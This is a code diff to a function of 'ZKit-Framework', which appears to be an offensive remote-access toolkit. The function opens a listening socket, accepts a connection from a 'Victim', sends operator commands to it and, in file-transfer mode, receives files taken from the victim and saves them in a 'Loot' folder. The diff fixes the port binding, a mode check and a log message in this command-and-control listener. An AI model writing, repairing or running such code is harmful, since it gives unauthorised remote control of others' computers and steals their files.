@@ -16,7 +16,7 @@ def connect(Connection_Type: str, port: int, type: str):
 
     print("[" + blue + 'REPORT' + reset + "]  Making Connection")
     try:
-        Connection.bind('', 1534)
+        Connection.bind('', int(port))
         Connection.listen()
         Victim, Address = Connection.accept()
 
@@ -28,7 +28,7 @@ def connect(Connection_Type: str, port: int, type: str):
             Command = str(input(""))
             Connection.send(Command.encode("UTF-8"))
             result = Connection.recv(1024).decode("UTF-8")
-            if type == 'ft:':
+            if type == 'ft':
                 if result == '!!!':
                     filelen = Connection.recv(1024).decode("UTF-8")
                     filedata = Connection.recv(int(filelen) + 100)
@@ -36,7 +36,7 @@ def connect(Connection_Type: str, port: int, type: str):
                     file = path.dirname(path.dirname(
                         path.dirname(__file__))) + '\\Loot\\' + file
                     print(
-                        "ZKit-Framework got file from victim {} . writing it in {}".format(Address, file))
+                        "ZKit-Framework got file from victim ({}) . writing it in {}".format(Address, file))
                     with open(file, 'wb') as f:
                         f.write(filedata)
                     print("Operation was Succesful (file {})".format(file))
